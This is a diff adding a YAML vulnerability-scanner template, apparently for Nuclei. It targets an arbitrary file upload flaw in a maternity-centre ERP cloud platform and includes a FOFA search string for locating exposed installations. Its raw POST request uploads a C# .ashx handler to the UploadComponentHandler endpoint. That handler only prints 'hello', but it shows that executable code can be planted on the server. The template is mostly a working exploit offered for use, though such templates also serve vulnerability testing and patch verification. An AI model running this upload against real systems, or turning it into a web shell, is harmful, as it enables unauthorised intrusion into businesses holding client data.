@@ -1,0 +1,21 @@
+id: poc-0545641f10aaa5fa6bab
+info:
+  name: 月子会所ERP管理云平台UploadComponent任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/0545641f10aaa5fa6babb67b677f461f
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 0545641f10aaa5fa6babb67b677f461f
+    fofa: + fofa`product="妈妈宝盒-ERP"`
+http:
+- raw:
+  - "POST /Page/UploadComponent/UploadComponentHandler.ashx HTTP/1.1\nContent-Type: multipart/form-data; boundary=00content0boundary00\nUser-Agent: Java/1.8.0_381\nHost: {{Hostname}}\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\nContent-Length: 481\nConnection: close\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"file\"; filename=\"1.ashx\"\n\n<% @ webhandler language=\"C#\" class=\"AverageHandler\" %>\nusing System;\nusing System.Web;\n\npublic class AverageHandler : IHttpHandler\n{\n    public bool IsReusable\n    {\n        get {\n             return true;\n            }\n        }\n        public void ProcessRequest(HttpContext ctx)\n        {\n            ctx.Response.Write(\"hello\");\n        }\n    }\n--00content0boundary00--"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
